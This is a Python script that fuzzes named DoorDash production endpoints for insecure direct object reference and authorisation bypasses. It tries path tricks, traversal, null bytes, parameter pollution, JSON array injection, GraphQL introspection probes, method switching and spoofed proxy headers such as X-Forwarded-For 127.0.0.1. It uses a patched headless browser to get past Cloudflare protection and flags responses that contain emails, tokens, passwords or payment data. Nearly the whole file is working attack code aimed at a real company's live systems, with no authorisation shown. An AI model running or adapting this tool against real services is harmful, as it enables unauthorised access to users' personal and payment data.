#!/usr/bin/env python3
"""
doorbash-idor.py — IDOR fuzzer applying AmrSec's 11+ bypass techniques to DoorDash endpoints.

Techniques:
1.  %20 space bypass    6.  Sub-path variants      11. Object param pollution
2.  Trailing slash       7.  HTTP Parameter Pollution
3.  Double slash         8.  JSON array injection
4.  Dot tricks           9.  Bracket notation
5.  API version downgrade 10. Leading zeros / wildcards

Usage:
    python3 doorbash-idor.py                    # all targets
    python3 doorbash-idor.py dasher             # dasher-mobile-bff only
    python3 doorbash-idor.py --quick            # fast subset of techniques
"""

import re
import sys
import json
import time
import random
import requests
from urllib.parse import urlencode, urljoin
from pathlib import Path

OUTPUT_DIR = Path("/tmp/doordash/idor")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# TARGET ENDPOINTS — organized by host
# ---------------------------------------------------------------------------
TARGETS = [
    # === dasher-mobile-bff (public, no auth, no CF) ===
    {
        "name": "dasher-me",
        "host": "dasher-mobile-bff.doordash.com",
        "method": "GET",
        "path": "/v1/dashers/me",
        "query": {},
        "body": None,
        "note": "Public endpoint, 405 on GET, try POST/PUT with bypasses",
    },
    {
        "name": "dasher-me-POST",
        "host": "dasher-mobile-bff.doordash.com",
        "method": "POST",
        "path": "/v1/dashers/me",
        "query": {},
        "body": {},
        "note": "POST /v1/dashers/me — 405 earlier, try bypasses",
    },
    {
        "name": "dasher-auth",
        "host": "dasher-mobile-bff.doordash.com",
        "method": "GET",
        "path": "/v1/auth",
        "query": {},
        "body": None,
        "note": "Exists (403), try version downgrade + bypasses",
    },
    {
        "name": "dasher-root-api",
        "host": "dasher-mobile-bff.doordash.com",
        "method": "GET",
        "path": "/v1/dashers",
        "query": {},
        "body": None,
        "note": "Try with ID param pollution",
    },

    # === api.doordash.com (API subdomain, 401 on /drive) ===
    {
        "name": "api-drive",
        "host": "api.doordash.com",
        "method": "GET",
        "path": "/drive",
        "query": {},
        "body": None,
        "note": "401 — endpoint exists, try version downgrade + bypasses",
    },
    {
        "name": "api-drive-v1",
        "host": "api.doordash.com",
        "method": "GET",
        "path": "/v1/drive",
        "query": {},
        "body": None,
    },
    {
        "name": "api-drive-v2",
        "host": "api.doordash.com",
        "method": "GET",
        "path": "/v2/drive",
        "query": {},
        "body": None,
    },

    # === risk-bff (GraphQL, no auth, no CF) ===
    {
        "name": "risk-bff-graphql",
        "host": "risk-bff.doordash.com",
        "method": "POST",
        "path": "/challenges",
        "query": {},
        "body": {"query": "query { __typename }"},
        "note": "GraphQL — try field brute-force with bypass queries",
    },

    # === www.doordash.com (CF protected, needs Playwright) ===
    {
        "name": "www-orders-drive",
        "host": "www.doordash.com",
        "method": "GET",
        "path": "/orders/drive/",
        "query": {},
        "body": None,
        "needs_pw": True,
        "note": "CF-protected — browser only",
    },
    {
        "name": "www-api-graphql",
        "host": "www.doordash.com",
        "method": "POST",
        "path": "/api/graphql",
        "query": {},
        "body": {"query": "{ __typename }"},
        "needs_pw": True,
    },
]

# ---------------------------------------------------------------------------
# BYPASS TECHNIQUES
# ---------------------------------------------------------------------------

def generate_bypasses(path, query_params, body):
    """
    Generate all bypass variations for a given endpoint.
    Returns list of (description, modified_path, modified_query, modified_body, modified_method, extra_headers)
    """
    bypasses = []

    # --- 1. %20 Space bypass (append to path) ---
    bypasses.append(("space-bypass-path", path + "%20", query_params, body, None, None))
    bypasses.append(("space-bypass-path-space", path + " ", query_params, body, None, None))

    # --- 2. Trailing slash ---
    if not path.endswith("/"):
        bypasses.append(("trailing-slash", path + "/", query_params, body, None, None))

    # --- 3. Double slash ---
    # /v1/dashers/me → /v1/dashers//me
    parts = path.split("/")
    if len(parts) >= 3:
        # Insert double slash at various positions
        for i in range(1, len(parts)):
            modified = parts[:i] + [""] + parts[i:]
            double_slash_path = "/".join(modified)
            bypasses.append((f"double-slash-{i}", double_slash_path, query_params, body, None, None))

    # --- 4. Dot tricks ---
    # /v1/dashers/me → /v1/./dashers/me
    parts = path.split("/")
    if len(parts) >= 3:
        for i in range(2, len(parts)):
            modified = parts[:i] + [".", ""] + parts[i:]
            dot_path = "/".join(modified)
            bypasses.append((f"dot-path-{i}", dot_path, query_params, body, None, None))

    # /../ bypass (path traversal)
    if len(parts) >= 4:
        modified = parts[:1] + [".."] + parts[2:]
        trav_path = "/".join(modified)
        bypasses.append(("path-traversal", trav_path, query_params, body, None, None))

    # --- 5. API version downgrade ---
    v_match = re.match(r"^(/v)(\d+)(/.*)", path)
    if v_match:
        for v in range(1, 6):
            downgraded = f"{v_match.group(1)}{v}{v_match.group(3)}"
            if downgraded != path:
                bypasses.append((f"version-downgrade-v{v}", downgraded, query_params, body, None, None))
    else:
        for v in range(1, 4):
            if path.startswith("/api/"):
                bypasses.append((f"version-prefix-v{v}", f"/api/v{v}{path[4:]}", query_params, body, None, None))

    # --- 6. Sub-path variants ---
    sub_paths = ["/details", "/orders", "/profile", "/settings", "/data",
                 "/info", "/status", "/summary", "/metadata", "/history",
                 "/payments", "/earnings", "/statistics", "/activity"]
    for sub in sub_paths:
        bypasses.append((f"subpath-{sub.lstrip('/')}", path + sub, query_params, body, None, None))

    # --- 7. HTTP Parameter Pollution (query params) ---
    if query_params:
        base_params = dict(query_params)
        # Duplicate param
        for key in list(base_params.keys()):
            polluted = dict(base_params)
            polluted[key] = [base_params[key], "9"]  # array value
            bypasses.append((f"hpp-{key}-array", path, polluted, body, None, None))

        # Multiple values with different casing
        for key in list(base_params.keys()):
            polluted = dict(base_params)
            polluted[key.upper()] = "9"
            bypasses.append((f"hpp-{key}-case", path, polluted, body, None, None))

    # For endpoints with no query params, add common ID params
    id_params = {"id": "9", "user_id": "9", "dasher_id": "9", "challengeId": "9"}
    for param_name, param_val in id_params.items():
        # Single param
        bypasses.append((f"param-add-{param_name}", path, {param_name: param_val}, body, None, None))
        # Pollution
        bypasses.append((f"hpp-{param_name}-dupe", path,
                         {param_name: [param_val, f"another_{param_val}"]}, body, None, None))
        # Brackets
        bypasses.append((f"bracket-{param_name}", path,
                         {f"{param_name}[]": [param_val, f"another_{param_val}"]}, body, None, None))
        # Object notation
        bypasses.append((f"object-{param_name}", path,
                         {f"{param_name}[user]": param_val, f"{param_name}[victim]": "9"}, body, None, None))

    # --- 8. JSON array injection (body) ---
    if body and isinstance(body, dict):
        for key in list(body.keys()):
            if isinstance(body[key], str):
                modified = dict(body)
                modified[key] = [body[key], "9"]
                bypasses.append((f"json-array-{key}", path, query_params, modified, None, None))
                modified2 = dict(body)
                modified2[key] = [body[key], None]
                bypasses.append((f"json-array-null-{key}", path, query_params, modified2, None, None))
            elif isinstance(body[key], (int, float)):
                modified = dict(body)
                modified[key] = [body[key], 9]
                bypasses.append((f"json-array-int-{key}", path, query_params, modified, None, None))

        # GraphQL-specific: inject __schema, __type probes
        if "query" in body:
            schema_probes = [
                "query { __type(name: \"Dasher\") { name fields { name } } }",
                "query { __type(name: \"Drive\") { name fields { name } } }",
                "query { __type(name: \"Order\") { name fields { name } } }",
                "{__schema{types{name}}}",  # introspection (likely blocked but worth trying)
                "query { _service { sdl } }",  # Apollo federation
            ]
            for i, probe in enumerate(schema_probes):
                modified = dict(body)
                modified["query"] = probe
                bypasses.append((f"graphql-probe-{i}", path, query_params, modified, None, None))

    # --- 9. Leading zeros ---
    if query_params:
        for key, val in query_params.items():
            if isinstance(val, str) and val.isdigit():
                bypasses.append((f"leading-zero-{key}", path,
                                {key: f"00000{val}"}, body, None, None))

    # --- 10. Wildcards ---
    if query_params:
        for key, val in query_params.items():
            if isinstance(val, str):
                bypasses.append((f"wildcard-{key}-pct", path,
                                {key: f"{val}%"}, body, None, None))
                bypasses.append((f"wildcard-{key}-star", path,
                                {key: f"{val}*"}, body, None, None))
                bypasses.append((f"wildcard-{key}-uscore", path,
                                {key: f"{val}_"}, body, None, None))

    # --- 11. Null byte injection ---
    for null_char in ["%00", "%2500"]:
        bypasses.append((f"null-byte-{null_char.replace('%','pct')}", path + null_char, query_params, body, None, None))

    # --- 12. Method switching ---
    if body is not None:
        for alt_method in ["PUT", "PATCH"]:
            bypasses.append((f"method-{alt_method}", path, query_params, body, alt_method, None))
    else:
        # Even for body-less endpoints, try method changes
        for alt_method in ["POST", "PUT", "PATCH"]:
            bypasses.append((f"method-{alt_method}", path, query_params, {}, alt_method, None))

    # --- 13. Proxy header injection (X-Original-URL, X-Forwarded-For) ---
    proxy_headers = [
        {"X-Original-URL": path},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Rewrite-URL": path},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    for i, hdrs in enumerate(proxy_headers):
        hdr_name = list(hdrs.keys())[0]
        bypasses.append((f"proxy-hdr-{i}", path, query_params, body, None, hdrs))

    return bypasses


# ---------------------------------------------------------------------------
# EXECUTION ENGINE — Direct requests (non-CF targets)
# ---------------------------------------------------------------------------
SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "DoorDash/25.0 (iPhone; iOS 18.0)",
    "Accept": "application/json, text/plain, */*",
})

def execute_direct(host, method, path, query_params, body, extra_headers=None):
    """Execute a single request directly (no Playwright)."""
    url = f"https://{host}{path}"
    if query_params:
        url += "?" + urlencode(query_params, doseq=True)

    headers = dict(SESSION.headers)
    if extra_headers:
        headers.update(extra_headers)

    try:
        if method == "GET":
            resp = SESSION.get(url, headers=headers, timeout=8, allow_redirects=False)
        elif method == "POST":
            resp = SESSION.post(url, json=body, headers=headers, timeout=8, allow_redirects=False)
        elif method == "PUT":
            resp = SESSION.put(url, json=body, headers=headers, timeout=8, allow_redirects=False)
        elif method == "PATCH":
            resp = SESSION.patch(url, json=body, headers=headers, timeout=8, allow_redirects=False)
        else:
            resp = SESSION.request(method, url, json=body, headers=headers, timeout=8, allow_redirects=False)

        return {
            "status": resp.status_code,
            "length": len(resp.content),
            "headers": dict(resp.headers),
            "body": resp.text[:500],
            "error": None,
        }
    except Exception as e:
        return {"status": 0, "length": 0, "headers": {}, "body": "", "error": str(e)[:120]}


# ---------------------------------------------------------------------------
# EXECUTION ENGINE — Playwright (CF-protected targets)
# ---------------------------------------------------------------------------
def execute_playwright(host, method, path, query_params, body, page, extra_headers=None):
    """Execute a request through Playwright browser (bypasses CF)."""
    url = f"https://{host}{path}"
    if query_params:
        url += "?" + urlencode(query_params, doseq=True)

    # Build headers object for JS
    js_headers = {"Content-Type": "application/json",
                  "Accept": "application/json, text/plain, */*"}
    if extra_headers:
        js_headers.update(extra_headers)

    body_js = f"opts.body = '{json.dumps(body)}';" if body else ""

    js_code = f"""
    async () => {{
        const opts = {{
            method: {json.dumps(method)},
            headers: {json.dumps(js_headers)},
        }};
        {body_js}
        try {{
            const resp = await fetch({json.dumps(url)}, opts);
            const text = await resp.text();
            return {{
                status: resp.status,
                length: text.length,
                headers: Object.fromEntries(resp.headers.entries()),
                body: text.substring(0, 500),
                error: null
            }};
        }} catch(e) {{
            return {{ status: 0, length: 0, headers: {{}}, body: '', error: e.message.substring(0, 120) }};
        }}
    }}
    """

    try:
        result = page.evaluate(js_code)
        return result
    except Exception as e:
        return {"status": 0, "length": 0, "headers": {}, "body": "", "error": str(e)[:120]}


# ---------------------------------------------------------------------------
# DIFF ENGINE — detect anomalies
# ---------------------------------------------------------------------------
def analyze_baseline(target):
    """Get baseline response for comparison."""
    return execute_direct(target["host"], target["method"],
                         target["path"], target["query"], target["body"])


def is_anomalous(baseline, result):
    """Check if a result differs from baseline in a meaningful way."""
    reasons = []

    # Status change
    if result["status"] != baseline["status"] and result["status"] > 0:
        # 4xx → 2xx or 3xx is huge
        if baseline["status"] >= 400 and result["status"] < 400:
            reasons.append(f"STATUS_DROP {baseline['status']}→{result['status']}")
        elif baseline["status"] < 400 and result["status"] >= 500:
            reasons.append(f"STATUS_500 {baseline['status']}→{result['status']}")
        else:
            reasons.append(f"STATUS_CHANGE {baseline['status']}→{result['status']}")

    # Body size change (>20% different)
    if baseline["length"] > 0 and result["length"] > 0:
        ratio = result["length"] / baseline["length"]
        if ratio > 1.3 or ratio < 0.7:
            reasons.append(f"SIZE_CHANGE {baseline['length']}→{result['length']} ({ratio:.1f}x)")

    # New data patterns (strip telemetry noise before scanning)
    if result["body"]:
        body_lower = result["body"].lower()
        # Strip known telemetry snippets so they don't trigger false positives
        # but real leaks in the same response still get caught
        for noise in ["nreum", "newrelic", "new relic", "google-analytics",
                      "googletagmanager", "sentry", "amplitude", "segment.com",
                      "cloudflareinsights", "_cf_beacon"]:
            body_lower = body_lower.replace(noise, "")
        data_keywords = ["dasher", "drive", "order", "user", "email", "phone",
                        "address", "name", "token", "session", "key", "secret",
                        "password", "credential", "payment", "card"]
        found = [kw for kw in data_keywords if kw in body_lower]
        if found:
            reasons.append(f"DATA_LEAK: {', '.join(found[:3])}")

    return reasons


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def run_target(target, use_pw=False, page=None, quick=False):
    """Run all bypass techniques against a single target endpoint."""
    name = target["name"]
    print(f"\n{'='*60}")
    print(f"🎯 {name}: {target['method']} {target['host']}{target['path']}")
    if target.get("note"):
        print(f"   📝 {target['note']}")
    print(f"{'='*60}")

    # Get baseline
    baseline = analyze_baseline(target)
    print(f"   Baseline: {baseline['status']} | {baseline['length']}B | body={baseline['body'][:80]}")

    # Generate bypasses
    bypasses = generate_bypasses(target["path"], target["query"], target["body"])
    if quick:
        # Only run most promising techniques
        bypasses = [b for b in bypasses if any(kw in b[0] for kw in [
            "space", "trailing", "double", "version", "subpath",
            "hpp", "json-array", "bracket", "null-byte", "method"
        ])]
    print(f"   Testing {len(bypasses)} bypass variations...")

    findings = []
    all_results = []
    count = 0

    for technique, bypass_path, bypass_query, bypass_body, bypass_method, bypass_headers in bypasses:
        count += 1
        method = bypass_method or target["method"]

        # Throttle
        time.sleep(random.uniform(0.05, 0.15))

        if use_pw and page:
            result = execute_playwright(target["host"], method, bypass_path,
                                       bypass_query, bypass_body, page, bypass_headers)
        else:
            result = execute_direct(target["host"], method, bypass_path,
                                   bypass_query, bypass_body, bypass_headers)

        all_results.append({
            "technique": technique,
            "path": bypass_path,
            "query": bypass_query,
            "body": bypass_body,
            "method": method,
            "result": result,
        })

        # Check for anomalies
        anomalies = is_anomalous(baseline, result)
        if anomalies:
            icon = "🔥" if any("DATA_LEAK" in a or "STATUS_DROP" in a for a in anomalies) else "⚠️"
            print(f"   {icon} {technique:35s} → {result['status']} | {result['length']}B | {' | '.join(anomalies)}")
            findings.append({
                "target": target["name"],
                "technique": technique,
                "path": bypass_path,
                "query": bypass_query,
                "body": bypass_body,
                "method": method,
                "result": result,
                "anomalies": anomalies,
            })

        if count % 20 == 0:
            print(f"   ... {count}/{len(bypasses)}")

    # Save results
    output_file = OUTPUT_DIR / f"{name}-results.json"
    with open(output_file, "w") as f:
        json.dump({"target": target, "baseline": baseline,
                   "findings": findings, "total": len(bypasses),
                   "all_results": all_results},
                  f, indent=2, default=str)

    # Summary
    print(f"\n   ✅ {len(findings)} anomalies out of {len(bypasses)} tests → {output_file}")
    for finding in findings[:5]:
        print(f"      🔥 {finding['technique']}: {finding['result']['status']} | {', '.join(finding['anomalies'][:2])}")

    return findings


def main():
    args = sys.argv[1:]
    quick = "--quick" in args
    target_filter = next((a for a in args if not a.startswith("-")), None)

    # Filter targets
    targets = TARGETS
    if target_filter:
        targets = [t for t in TARGETS if target_filter.lower() in t["name"].lower()]
    if not targets:
        print(f"No targets match '{target_filter}'")
        return

    all_findings = []

    try:
        # Start Playwright for CF-protected targets
        pw_targets = [t for t in targets if t.get("needs_pw")]
        direct_targets = [t for t in targets if not t.get("needs_pw")]

        if pw_targets:
            print("🌐 Starting patched Playwright for CF-protected targets...")
            from playwright_patched import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                context = browser.new_context()
                pw_page = context.new_page()
                # Warm up: load www.doordash.com to get CF cookie
                try:
                    pw_page.goto("https://www.doordash.com", wait_until="domcontentloaded", timeout=20000)
                    pw_page.wait_for_timeout(2000)
                    print(f"   CF warmup: {pw_page.evaluate('() => document.title')[:60]}")
                except Exception as e:
                    print(f"   CF warmup: {str(e)[:60]}")

                # Run direct targets
                for target in direct_targets:
                    findings = run_target(target, quick=quick)
                    all_findings.extend(findings)

                # Run Playwright targets
                for target in pw_targets:
                    findings = run_target(target, use_pw=True, page=pw_page, quick=quick)
                    all_findings.extend(findings)

                browser.close()
        else:
            # No PW targets — run direct only
            for target in direct_targets:
                findings = run_target(target, quick=quick)
                all_findings.extend(findings)

    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()

    # Final summary
    print(f"\n{'='*60}")
    print(f"📊 FINAL SUMMARY: {len(all_findings)} anomalies across {len(targets)} targets")
    print(f"{'='*60}")
    for f in all_findings:
        tname = f.get("target", "?")
        print(f"   🔥 [{tname}] {f['technique']:25s} → {f['result']['status']} | {'; '.join(f['anomalies'][:2])}")

    # Save combined findings
    combined = OUTPUT_DIR / "all-findings.json"
    with open(combined, "w") as f:
        json.dump(all_findings, f, indent=2, default=str)
    print(f"\n💾 Full findings: {combined}")
    print(f"💾 Per-target results: {OUTPUT_DIR}/")


if __name__ == "__main__":
    main()
